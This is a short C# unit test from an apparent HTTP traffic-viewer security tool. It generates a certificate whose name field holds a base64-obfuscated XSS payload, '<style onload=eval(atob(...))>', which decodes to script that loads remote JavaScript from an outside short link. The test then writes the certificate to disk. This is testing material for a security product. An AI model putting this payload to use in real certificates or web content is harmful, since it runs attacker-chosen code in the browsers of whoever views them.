using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TrafficViewerInstance;
using TrafficViewerSDK;
using TrafficViewerSDK.Http;

namespace TrafficViewerUnitTest
{
    [TestClass]
    public class CertificateUnit
    {
        [TestMethod]
        public void Test_Make_XSS_Cert()
        {
            SdkSettings.Instance.CAPrivateKey = Encryptor.DecryptToString(TrafficViewerOptions.Instance.CACertPrivKey);
            var certificate = CertificateAuthority.GetBlackOpsCert("<style onload=eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaWJtLmJpei9CZHJRamoiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))>");
            File.WriteAllBytes("c:\\test.der", certificate.RawData);
        }
    }

    


        
}
